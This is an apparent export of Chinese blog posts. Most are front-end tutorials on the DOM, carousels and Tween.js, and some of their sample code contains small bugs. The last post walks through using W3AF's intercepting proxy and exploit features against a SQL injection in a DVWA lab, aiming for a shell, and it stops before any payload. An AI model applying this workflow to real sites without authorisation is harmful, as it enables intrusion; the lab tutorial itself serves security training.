      <content type="text"><![CDATA[0x00 What’s DOMDOM(文档对象模型) 是针对 HTML 和 XML 文档的一个 API(Application Programing Interface 应用程序编程接口)。 DOM 描绘了一个层次化的节点数，允许开发人员添加，修改和移除页面的某一部分。 注意 IE 中的所有 DOM 对象都是以 COM 对象的形式实现的，这意味着 IE 中的 DOM 对象与原生的 JS 对象的行为或活动点特点并不一致。 0x01 Node 类型每一个节点都有一个 childNodes 属性，其中保存着一个 NodeList 对象。 NodeList 是一种类数组对象，用于保存一组有序的节点。 每个节点都有一个 NodeType 属性，用于表明节点类型。 Document 类型的节点类型为: 9 元素的节点类型: 1 文本节点的节点类型: 3 访问节点someNode.nodeName; 获取节点名称someNode.nodeType; 获取节点类型someNode.childNodes; 获取标签内所有节点someNode.children; 只获取标签类型的节点someNode.parentNode; 获取元素父级节点somdeNode.nextElementSibling; 获取下一个同级标签节点someNode.nextSibling; 获取下一个同级节点，不限节点类型someNode.previousElementSibling; 获取上一个同级标签节点someNode.previousSibling; 获取上一个同级节点，不限节点类型someNode.firstElementChild; 获取第一个子标签元素someNode.firstChild; 获取第一个子节点someNode.lastElementChild; 获取最后一个子标签元素someNode.lastChild; 获取最后一个子节点 操作节点appendChild()向 childNodes 列表末尾添加一个节点 1234var newLi = document.createElement(&quot;li&quot;);var newSpan = document.createElement(&quot;span&quot;);newSpan.innerHTML = &quot;我是 span&quot;;newLi.appendChild(newSpan); appendChild() 无法对类选择器等类数组形式的元素进行批量操作。 insertBefore()该方法接收两个参数: 要插入的节点和作为参考的节点。 12345var ul = document.querySelector(&quot;ul&quot;);var newLi = document.createElement(&quot;li&quot;);var newSpan = document.createElement(&quot;span&quot;);newLi.appendChild(newSpan);ul.insertBefore(newLi,ul.firstChild); replaceChild()该方法接收两个参数： 要插入的节点和要替换的节点。 123456var ul = document.querySelector(&quot;ul&quot;);var newLi = document.createElement(&quot;li&quot;);ul.replaceChild(newLi,ul.firstChild);// 替换第一个节点ul.replaceChild(newLi,ul.lastChild);// 替换最后一个节点 removeChild()只接受一参数，即要移除的节点。 1ul.removeChild(ul.firstChild); 以上四个操作方法都是某个节点的子节点，要使用这几个方法，必需先取得父节点。另外，并不是所有类型的节点都有子节点。以下两种方式则针对所有节点。 coloneNode()该方法只接收一个布尔值作为参数，当参数为 true 则进行深层复制，当参数为 flase 则进行浅层复制。 123var div = document.querySelector(&quot;#div&quot;);var newDiv = div.cloneNode(true);document.body.appendChild(newDiv); cloneNode() 方法不会复制添加到 DOM 中的 JavaScript 属性。 属性操作getAttribute()/setAttribute()getAttribut() 方法用于获取元素的属性； setAttribute() 方法用户设置元素的属性。 一个经典场景是，用于网页换肤。 123456&lt;link type = &quot;text/css&quot; href = &quot;style.css&quot;&gt;&lt;script&gt; var link = document.querySelector(&quot;link&quot;); link.setAttribute(&quot;href&quot;,&quot;style2.css&quot;);&lt;/script&gt; 0x01 Document 类型JS 使用 Document 类型表示文档。在浏览器中，document 对象是 HTMLDocument(继承自 Document 类型)的一个实例，以此表示整个 HTML 页面。而且，document 对象是 window 对象的一个属性。 访问文档子节点在 DOM 中最常用也是最快捷的访问子节点的方式是使用 documentElement 属性。该属性始终指向 HTML 页面中的 元素。 12var html = document.documentElement; //取得对 &lt;html&gt; 的引用var body = document.body; //取得对 &lt;body&gt; 的引用 文档信息document 对象作为 Document 对象的一个实例还具备了 Document 对象所没有的属性。 这些属性提供了 document 对象所表现的网页的一些信息。比如 title, URL, domain, referrer. URL 属性包含完整的 URL（地址栏中显示的 URL），domain 属性只包含页面的域名，而 referrer 属性中保存着链接到当前页面的那个页面的 URL。所有的这些信息都存在于 HTTP 头部，只不过是通过这些属性让我们能够在 JS 中访问它而已。 123456var title = document.title;// 获得文档标题var url = document.URL;// 获得完整 URL var referrer = document.referrer;// 获得来源页面的 URL 0x02 Element 类型除 Document 类型外，Element 类型就算是 Web 编程中最常用的类型了。Element 类型用于表现 XML 或者 HTML 元素，提供了对元素标签名，子节点及特性的访问。 HTML 元素所有的 HTML 元素都由 HTMLElement 类型表示，不是直接通过这个类型，也是通过它的子类型来表示。HTMLElement 类型直接继承自 Element 并添加了一些属性。 id: 元素在文档中的唯一标识 title: 有关元素的附加说明 lang: 元素内容的语言代码，绝少使用 dir: 语言方向，值为 “ltr”（left-to-right），绝少使用 className: 与元素的 class 特性对应。 每个 HTML 元素都会有一个或者多个特性。这些特性的作用是给出相应元素或其内容的附加信息。操作特性的 DOM 方法主要有三个，getAttribute(), setAttribute(), removeAttribute()，但是使用这类方法访问对象元素时，不同的浏览器间会存在差异，所以，并不常用，而只是在取得自定义特性值的情况下，才会使用这类特性。 创建元素使用 document.createElement() 方法可以创建新元素。 1var div = document.createElement(&quot;div&quot;); 该方法只接受一个参数，即要创建的元素的标签名。这个标签名在 HTML 中不区分大小写，而在 XML(包括 XHTML) 中需要区分大小写)。 使用 createElement() 创建新元素的同时，也为新元素设置了 ownerDocument 属性。此时，可以为其添加更多子节点，以及执行其他操作。 12div.id = &quot;myNewDiv&quot;;div.className = &quot;box&quot;; 但是以上操作只是为新元素赋予了相应信息，还需要使用 appendChild(), insertBefore(), replaceChild() 把新元素添加到文档树。 将 div 添加到 body 中 1document.body.appendChild(div); 一旦将新元素添加到文档树种，浏览器就会立即解析该元素，此后对这个元素所作的任何修改都会实时反映在浏览中。 0x03 Text 类型文本节点有 Text 类型表示，纯文本中可以包含转义后的 HTML 字符，但是不能包含 HTML 代码。 创建文本节点可以使用 document.createTextNode() 创建新的文本节点，该方法只接受一个参数—要插入节点的文本。 以方法可以操作节点中文本 appendData(text)将 text 添加到节点的末尾 deleteDate(offset, count)从 offset 指定的位置开始删除 count 个字符 insertDate(offset, text)在 offset 指定的位置插入 text replaceDate(offset, count, text)用 text 替换从 offset 到 offset+count 为止的字符 splitText(offset)从 offset 位置将文本分为两个文本节点 substringData(offset, count)提取从 offset 到 offset+count 处的字符。 此外，还可以通过文本的 text.length 属性获得字符的长度。 0x04 DOM 操作技术 关于 NodeList理解 NodeList， 及其近亲，NamedNodeMap, 和 HTMLCollection，是彻底理解 DOM 的关键所在。 首先它们三个都是动态的，每当文档结构发生变化时，它们都会更新。 而从本质上来讲，所有 NodeList 对象都是在访问 DOM 文档时实时运行的查询。 所以，若是要迭代一个 NodeList ，那最好使用 length 属性初始化一个变量。 12345678910var divs = document.getElementByTagName(&quot;div&quot;);i,len,div;for( i = 0,len = divs.length; i &lt; len;i ++)&#123; div = document.createElement(&quot;div&quot;); document.body.appendChild(div);&#125; 理解 DOM 的关键，便是要知道 DOM 对性能的影响。 DOM 操作往往是 JavaScript 程序中开销最大的部分，因为访问 NodeList 导致的问题的最多。NodeList 对象是动态的，这意味着每次访问 NodeList 对象，都会运行一次查询。所以，应该尽量减少 DOM 操作。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Table无切换刷新]]></title>
      <url>%2F2016%2F10%2F08%2FTable%E6%97%A0%E5%88%87%E6%8D%A2%E5%88%B7%E6%96%B0%2F</url>
      <content type="text"><![CDATA[0x00 Table无切换刷新123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;style type=&quot;text/css&quot;&gt; *&#123; margin:0; padding:0; list-style:none; box-sizing: border-box; &#125; ul&#123; text-align: center; width:600px; height: 40px; background: yellowgreen; &#125; li &#123; float:left; border:1px deeppink solid; width:200px; cursor: pointer; &#125; #wrap&#123; width:600px; height: 400px; /*background-color: red;*/ &#125; .box &#123; width: 100%; height: 100%; float: left; &#125; .box:first-child&#123; background: green; display: none; &#125; .box:nth-child(2)&#123; background: black; display: none; &#125; .box:last-child&#123; background: deeppink; &#125; &lt;/style&gt; &lt;body&gt; &lt;ul&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;/ul&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;script type=&quot;text/javascript&quot;&gt; var lis = document.getElementsByTagName(&quot;li&quot;); var div = document.getElementsByClassName(&quot;box&quot;); for(var i = 0;i &lt; lis.length;i++)&#123; lis[i].index = i; lis[i].onclick = function function_name(argument) &#123; // body... num = this.index; for(var j = 0; j &lt; div.length;j ++)&#123; div[j].style.display = &quot;none&quot;; div[num].style.display = &quot;block&quot;; &#125; &#125; &#125;&lt;/script&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[结构与布局]]></title>
      <url>%2F2016%2F10%2F08%2F%E7%BB%93%E6%9E%84%E4%B8%8E%E5%B8%83%E5%B1%80%2F</url>
      <content type="text"><![CDATA[0x00 自适应内部元素如果我们不给元素指定一个具体的 height ，它就会自动适应其内容的高度。假若我们希望 width 也具有类似的行为呢？ 0x01 垂直居中1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; margin: 0;padding: 0; &#125; #warp&#123; width: 400px;height: 400px;background: red;text-align: center; &#125; #middle&#123; width: 200px;height: 200px;background: yellow; display: inline-block;vertical-align: middle; &#125; span&#123; display: inline-block;height: 100%;vertical-align: middle; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;warp&quot;&gt; &lt;div id=&quot;middle&quot;&gt;&lt;/div&gt; &lt;span&gt;&lt;/span&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 0x02 Table无切换刷新]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[轮播图的N种方式]]></title>
      <url>%2F2016%2F10%2F08%2F%E8%BD%AE%E6%92%AD%E5%9B%BE%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F%2F</url>
      <content type="text"><![CDATA[0x00 JS+CSS 图片轮播功能描述: 图片自动轮播，鼠标可通过左右选择滑动下一张图片。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;myExperimentPages&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; margin:0; padding: 0; list-style: none; text-decoration: none; &#125; #wrapper&#123; position: relative; width: 1024px; height: 768px; border:1px solid green; overflow: hidden; &#125; #imageboxs &#123; border:1px red solid; width: 6000px; height: 600px; position: absolute; left: 0; top: 0; transition:all .5s ease-in .1s; &#125; #control &#123; width: 360px; height: 35px; border: 1px solid red; position: absolute; bottom: 10; right: 0; &#125; #control ul &#123; float:left; &#125; #control li &#123; float:left; width: 30px; height: 30px; border-radius: 15px; border:1px solid red; text-align: center; cursor:pointer; &#125; #control li a &#123; display: inline-block; width: 30px height:30px; &#125; #control p &#123; float: left; width: 100px; background-color: red; line-height: 35px; text-align: center; cursor:pointer; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;wrapper&quot;&gt; //轮播框，必不可少，相对定位 &lt;div id=&quot;imageboxs&quot;&gt; // 图片载体，必不可少，相对定位 &lt;a href=&quot;&quot;&gt;&lt;img src=&quot;myImages/1.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;a href=&quot;&quot;&gt;&lt;img src=&quot;myImages/2.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;a href=&quot;&quot;&gt;&lt;img src=&quot;myImages/3.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;a href=&quot;&quot;&gt;&lt;img src=&quot;myImages/4.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt; &lt;/div&gt; &lt;div id=&quot;control&quot; //控制按钮，绝对定位 &lt;p id = &quot;prevNext&quot;&gt;前一页&lt;/p&gt; &lt;ul&gt; &lt;li class=&quot;con-li&quot;&gt;&lt;a href=&quot;&quot;&gt;1&lt;/a&gt;&lt;/li&gt; &lt;li class=&quot;con-li&quot;&gt;&lt;a href=&quot;&quot;&gt;2&lt;/a&gt;&lt;/li&gt; &lt;li class=&quot;con-li&quot;&gt;&lt;a href=&quot;&quot;&gt;3&lt;/a&gt;&lt;/li&gt; &lt;li class=&quot;con-li&quot;&gt;&lt;a href=&quot;&quot;&gt;4&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;p id = &quot;afterNext&quot;&gt;后一页&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;script type=&quot;text/javascript&quot;&gt; var isWrapper = document.getElementById(&quot;wrapper&quot;); var boxsImage = document.getElementById(&quot;imageboxs&quot;); var liControlArr = document.getElementsByClassName(&quot;con-li&quot;); var nextPrev = document.getElementById(&quot;prevNext&quot;); var nextAfter = document.getElementById(&quot;afterNext&quot;); var i = 0; // 记录当前显示的图片 nextAfter.onclick = function function_name(argument) &#123; // body... i ++; if(i &gt; 3)&#123; i=0; &#125; boxsImage.style.left = (-1024*i) + &quot;px&quot;; &#125; nextPrev.onclick = function ()&#123; i --; if ( i &lt; 0)&#123; i = 3; boxsImage.style.left = (-1024*i) + &quot;px&quot;; &#125;else&#123; boxsImage.style.left = (-1024*i) + &quot;px&quot;; &#125; &#125; function autoPlay ()&#123; // 移动图片函数 i ++; if(i &gt; 3)&#123; i=0; &#125; boxsImage.style.left = (-1024*i) + &quot;px&quot;; &#125; var timer = setInterval(autoPlay,1000); //自动轮播 isWrapper.onmouseover = function ()&#123; // 鼠标划中，停止轮播 clearInterval(timer); &#125; isWrapper.onmouseout = function ()&#123; //鼠标划出，开始轮播 timer = setInterval(autoPlay,1000); &#125; for( var j=0;j&lt;liControlArr.length;j++)&#123; //为每个 li 添加 对应的图片移动事件 console.log(liControlArr.length); liControlArr[j].index = j; liControlArr[j].onmouseover = function ()&#123; console.log(this.index); boxsImage.style.left = (-1024*(this.index)) +&quot;px&quot;; &#125; &#125;&lt;/script&gt;&lt;/html&gt; 0x01 为轮播添加一个短暂的停留123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; margin:0; padding: 0; box-sizing: border-box; &#125; #wrap &#123; height: 400px; width:260px; border: 1px solid red; position: relative; overflow: hidden; &#125; #boxImg &#123; width:5000px; height: 100%; position: absolute; left:0; top:0; &#125; #boxImg img &#123; float: left; &#125; #btnDiv &#123; position: absolute; top:100px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;boxImg&quot;&gt; &lt;a href=&quot;&quot;&gt;&lt;img src=&quot;../20DAY/1.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;&quot;&gt;&lt;img src=&quot;../20DAY/2.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;&quot;&gt;&lt;img src=&quot;../20DAY/3.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;&quot;&gt;&lt;img src=&quot;../20DAY/4.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;&quot;&gt;&lt;img src=&quot;../20DAY/5.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt; &lt;/div&gt; &lt;div id=&quot;btnDiv&quot;&gt; &lt;button class=&quot;btn&quot; onclick=&quot;nextLeft()&quot;&gt;&lt;&lt;/button&gt; &lt;button class=&quot;btn&quot; onclick=&quot;nextRight()&quot;&gt;&gt;&lt;/button&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;script type=&quot;text/javascript&quot;&gt; var boxImg = document.getElementById(&quot;boxImg&quot;); var mySetTiem1 = &quot;&quot;; var mySetTiem2 = &quot;&quot;; var timer1 = &quot;&quot;; var timer = &quot;&quot;; function clearAlltimer ()&#123; clearInterval(timer); clearInterval(timer1); clearTimeout(mySetTiem2); clearTimeout(mySetTiem1); &#125; var x = 0; function nextLeft ()&#123; clearAlltimer(); clearTimeout(mySetTiem2); timer1 = setInterval(function ()&#123; x -=1; if(x % 259 == 0)&#123; clearInterval(timer1); mySetTiem1 = setTimeout(nextLeft,1000); &#125; if( x &lt; -1036) &#123; x = 0; &#125; boxImg.style.left = x +&quot;px&quot;; &#125;, 1); &#125; function nextRight () &#123; clearAlltimer(); timer = setInterval(function ()&#123; x +=1; if(x % 259 == 0)&#123; clearInterval(timer); mySetTiem2 = setTimeout(nextRight,1000); &#125; if( x &gt; 0) &#123; x = -1036; &#125; boxImg.style.left = x +&quot;px&quot;; &#125;, 1); &#125; &lt;/script&gt;&lt;/html&gt; 0x02 Tween.js 为轮播添加动画效果123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;tween.js&quot;&gt;&lt;/script&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; margin: 0; padding: 0; &#125; ul&#123; list-style: none; &#125; #bannerBox&#123; /*banner盒子，宽度和高度应该等于图片高度宽度*/ width: 1000px; height: 600px; border: 2px solid red; margin: 0 auto; position: relative; overflow:hidden; &#125; #bannerImgs&#123; /*banner 图片载体*/ width: 9999px; height: 600px; background-color: purple; position: absolute; left: 0; top: 0; &#125; #bannerControl&#123; width: 360px; height: 40px; border: 2px solid yellow; position: absolute; bottom: 0; right: 0; &#125; #bannerControl p&#123; float: left; width: 100px; background: #ccc; line-height: 40px; text-align: center; cursor: pointer; &#125; #btns li&#123; float: left; width: 40px; height: 40px; background-color: #ccc; border-radius: 20px; line-height: 40px; text-align: center; cursor: pointer; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;bannerBox&quot;&gt; &lt;div id=&quot;bannerImgs&quot;&gt; &lt;a href=&quot;#&quot;&gt;&lt;img src=&quot;../img/01.jpg&quot;/&gt;&lt;/a&gt;&lt;img src=&quot;../img/02.jpg&quot;/&gt;&lt;img src=&quot;../img/03.jpg&quot;/&gt;&lt;img src=&quot;../img/04.jpg&quot;/&gt; &lt;/div&gt; &lt;div id=&quot;bannerControl&quot;&gt; &lt;p id=&quot;prev&quot;&gt;前一页&lt;/p&gt; &lt;ul id=&quot;btns&quot;&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;/ul&gt; &lt;p id=&quot;next&quot;&gt;后一页&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; //找对象 var imgs = document.getElementById(&quot;bannerImgs&quot;); var prevbtn = document.getElementById(&quot;prev&quot;); var nextbtn = document.getElementById(&quot;next&quot;); var lis = document.getElementsByTagName(&quot;li&quot;); var timerIntCavans = &quot;&quot;; // 定时器，用于控制banner移动的动画效果 var timerOutAutoPlay = &quot;&quot;; //定时器，延时调用自动轮播 var timerIntAutoPlay = &quot;&quot;; //定时器，用于banner自动轮播 var num = 0; // num 用于匹配当前聚焦的 li 或者imgs所在的位置 function clearAllTimer(argument) &#123; // body... // 清除定时器 clearInterval(timerIntCavans); clearInterval(timerIntAutoPlay); clearTimeout(timerOutAutoPlay); &#125; //为每一个 Li 按钮添加 imgs 移动事件 for(var i = 0; i &lt; lis.length; i++)&#123; lis[i].index = i;//把i的值记录一下,添加到每一个li对象的index属性里 lis[i].onclick = function()&#123; clearAllTimer(); num = this.index; clickMove(); &#125; &#125; function clickMove ()&#123; // 控制 imgs 移动 var step = 30; //分三十次完成移动 var start = 0; //移动初始量 var targetPosition = num*1000*-1; //目标位置 var nowPosition = imgs.offsetLeft; //目标当前的位置 var changeDisplacement = targetPosition - nowPosition; //目标需要改变的位置 timerIntCavans = setInterval(function()&#123; //timer 设置定时器，使其每十帧移动一次 start ++; if( start &gt;= step)&#123; clearInterval(timerIntCavans); &#125; imgs.style.left = Tween.Bounce.easeInOut(start,nowPosition,changeDisplacement,step)+&quot;px&quot;; &#125;,10); timerOutAutoPlay = setTimeout(autoPlay,2000); // 定时器，延时调用自动轮播 changeColors(num); // 改变 当前 li 的颜色 &#125; prevbtn.onclick = function () &#123; clearAllTimer(); num --; if( num &lt; 0)&#123; num = 3; &#125; clickMove(); &#125; nextbtn.onclick = function ()&#123; clearAllTimer(); num ++; if (num &gt; 3)&#123; num = 0; &#125; clickMove(); &#125; function autoPlay ()&#123; clearAllTimer(); var x = imgs.offsetLeft; timerIntAutoPlay = setInterval(function()&#123; x -=1; if( x%1000 == 0)&#123; num ++; clearInterval(timerIntAutoMove); timerOutAutoPlay = setTimeout(autoPlay,2000); &#125; if(num &gt; 3)&#123; num = 0; &#125; changeColors(num); if (x &lt; -3000)&#123; x = 0; &#125; imgs.style.left = x + &quot;px&quot;; &#125;,1); &#125; function changeColors (index)&#123; for(var i = 0; i &lt; lis.length; i ++)&#123; lis[i].style.backgroundColor = &quot;red&quot;; &#125; lis[index].style.backgroundColor = &quot;black&quot;; &#125; autoPlay(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 0x03 使用opcaity实现图片轮播123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102// HTML&lt;div class=&quot;swiper-container&quot;&gt; &lt;div class=&quot;swiper-wrapper&quot;&gt; &lt;div id=&quot;swiper-img-box&quot;&gt; &lt;img src=&quot;images/rendering/Z.jpg&quot; alt=&quot;&quot;&gt; &lt;img src=&quot;images/rendering/Z-1.jpg&quot; alt=&quot;&quot;&gt; &lt;img src=&quot;images/rendering/Z-2.jpg&quot; alt=&quot;&quot;&gt; &lt;/div&gt; &lt;div id=&quot;swiper-controll&quot;&gt; &lt;div class=&quot;swiper-con-item swiper-con-item-one&quot;&gt;&lt;/div&gt; &lt;div class=&quot;swiper-con-item swiper-con-item-two&quot; &gt;&lt;/div&gt; &lt;div class=&quot;swiper-con-item swiper-con-item-three&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;//CSS.swiper-wrapper &#123; height: 78vh; width: 100%; position: relative; overflow: hidden; border: 4px solid black;&#125;#swiper-img-box &#123; width: 100%; height: 100%; position: absolute; left: 0; top: 0; &#125;#swiper-img-box img &#123; width: 100%; height: 100%; position: absolute; left: 0; top:0; transition: all 1s ease ;&#125;#swiper-controll &#123; position: absolute; bottom: 20px; left: 50%; z-index: 999;&#125;.swiper-con-item &#123; width: 10px; height: 10px; border-radius: 5px; background: gray; margin-right: 5px; float: left;&#125;.swiper-con-item:focus,.swiper-con-item:hover &#123; background: yellowgreen;&#125;//js var swiper = document.querySelector(&quot;#swiper-img-box&quot;); var imgs = document.querySelectorAll(&quot;#swiper-img-box img&quot;); var controlItem = document.querySelectorAll(&quot;.swiper-con-item&quot;) function moveSwiper ()&#123; var num =0; moveSwiperTimer = setInterval(function()&#123; for(var i=0;i&lt;imgs.length;i++)&#123; imgs[i].style.opacity = 0; &#125; imgs[num].style.opacity = 1; num ++; if(num &gt; imgs.length-1)&#123; num =0; &#125; &#125;,5000); &#125; function SwiperClick ()&#123; clearTimeout(callmoveSwiper); for(var i=0;i&lt;controlItem.length;i++)&#123; controlItem[i].index = i; controlItem[i].onclick = function()&#123; clearInterval(moveSwiperTimer); for(var i=0;i&lt;imgs.length;i++)&#123; imgs[i].style.opacity = 0; &#125; imgs[this.index].style.opacity = 1; callmoveSwiper = setTimeout(moveSwiper,1000); &#125; &#125; &#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[TWEEN.JS动画类库]]></title>
      <url>%2F2016%2F10%2F08%2FTWEEN.JS%E5%8A%A8%E7%94%BB%E7%B1%BB%E5%BA%93%2F</url>
      <content type="text"><![CDATA[0x00 0x01 简单演示1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type=&quot;text/javascript&quot; src = &quot;tween.js&quot;&gt;&lt;/script&gt; &lt;!-- 引用 teween.js类库 --&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; background-color: black; &#125; #ball &#123; position: absolute; height: 80px; width:80px; border-radius: 40px; background-color: white; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;ball&quot;&gt; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; var myBall = document.getElementById(&quot;ball&quot;); var start = 0; // 开始的步数 var step = 30; // 步长 var nowPosition = 0; //初始位置 var targetPosition = 500; //目标位置 var changePosition = targetPosition - nowPosition; //改变的位移 var timer = setInterval(function()&#123; start ++; if(start &gt; step)&#123; clearTimeout(timer); &#125; myBall.style.left = Tween.Elastic.easeInOut(start,nowPosition,changePosition,step) + &quot;px&quot;; &#125;, 100) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 0x02 使用TWEEN 实现动态导航123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script type=&quot;text/javascript&quot; src = &quot;tween.js&quot;&gt;&lt;/script&gt; &lt;!-- 引用 teween.js类库 --&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; background-color: grey; text-decoration: none; list-style: none; margin:0; padding: 0; text-align:center; &#125; ul &#123; position: absolute; height: 30px; &#125; li &#123; float: left; width:100px; line-height: 30px; &#125; #navLine &#123; clear:both; width:100px; height: 4px; background-color: red; position: absolute; top:28px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;nav&gt; &lt;ul&gt; &lt;li&gt;我是第1个&lt;/li&gt; &lt;li&gt;我是第2个&lt;/li&gt; &lt;li&gt;我是第3个&lt;/li&gt; &lt;li&gt;我是第4个&lt;/li&gt; &lt;li&gt;我是第5个&lt;/li&gt; &lt;div id=&quot;navLine&quot;&gt; &lt;/div&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;script type=&quot;text/javascript&quot;&gt; var navLine = document.getElementById(&quot;navLine&quot;); var lisArr = document.getElementsByTagName(&quot;li&quot;); for (var i = lisArr.length - 1; i &gt;= 0; i--) &#123; lisArr[i].onmouseover = function ()&#123; var start = 0; var step = 30; var nowPosition = navLine.offsetLeft; var targetPosition = this.offsetLeft; var changePosition = targetPosition - nowPosition; var timer = setInterval(function ()&#123; start ++; if(start &gt;= step)&#123; clearTimeout(timer); &#125; navLine.style.left = Tween.Elastic.easeInOut(start,nowPosition,changePosition,step) + &quot;px&quot;; &#125;,10); &#125; &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[W3AF截断代理]]></title>
      <url>%2F2016%2F10%2F07%2FW3AF%E6%88%AA%E6%96%AD%E4%BB%A3%E7%90%86%2F</url>
      <content type="text"><![CDATA[0x00 截断代理通过w3af 的截断代理功能，可以查看到完成的客户端与服务器的请求数据。当然也可以使用 firebug 取获得请求的数据，但是没有 w3af 那般直观。 首先配置 w3af 的截断代理选项，如下，将监听本地8080端口: 然后在浏览器中添加代理 w3af 代理，将w3af获得的 http 响应头中所保持不变的数据保存为文本文件。 退出w3af 截断代理，选择 Configuration http setting ,在 General –&gt; header_files 中配置保存的 http header 文件路径，要扫描的目录网站的 url 信息等，如下: 如此，我们同样配置好了对要扫描的目标网站的认证信息，这与之前的 cookies 认证，auth 的 detailed 认证，或者 http base等的本质是一样的，在服务器看来，都是一个合法的客户端发起的请求。 通过 w3af 截断代理获得的 http 请求信息，使得我们可以在后续过程中进行手动爬网，fuzzing等，重放攻击等等。 0x01 w3af spider_man 插件w3af 不支持基于客户端的技术（比如 javascript ，flash， java applet）。为了解决这个问题，w3af 提供了一个基于插件的截断代理crawl 功能下的spider_man插件 ，而这种截断代理不同于上一种截断代理，上一种更倾向于后续的手动爬网，重定向等操作。而基于插件的截断代理，主要是为了发现客户端的漏洞。 oxo2 W3af ExploitW3af 最大的特点就是，它不当可以发现漏洞，同时还可以利用发现的漏洞。 我们先找一个可以拿到 shell 的漏洞。 首先启动 w3af 的截断代理: 进入到 dvwa 的页面，在 SQLinjection 页面随便输入点什么: 从 w3af 中获得该页面的 [http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit] http 请求数据： 将 Histoty –&gt; Request –&gt; Raw中的固定信息部分提取出来另存为 headfile 文本文件以作为网站认证的http认证信息,退出代理，然后在Configuration 中设置 General 信息。 设置完毕，在 